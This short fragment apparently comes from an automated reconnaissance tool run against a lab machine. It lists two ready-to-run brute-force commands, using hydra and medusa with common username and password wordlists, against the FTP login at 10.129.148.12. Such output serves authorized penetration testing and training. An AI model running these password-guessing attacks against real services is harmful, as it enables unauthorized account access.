```bash
[*] ftp on tcp/21

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "/media/adam/3268e159-c01d-4551-8089-f31f5ad8a3c7/ReconEnhance/results/10.129.148.12/scans/tcp21/tcp_21_ftp_hydra.txt" ftp://10.129.148.12

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 21 -O "/media/adam/3268e159-c01d-4551-8089-f31f5ad8a3c7/ReconEnhance/results/10.129.148.12/scans/tcp21/tcp_21_ftp_medusa.txt" -M ftp -h 10.129.148.12


```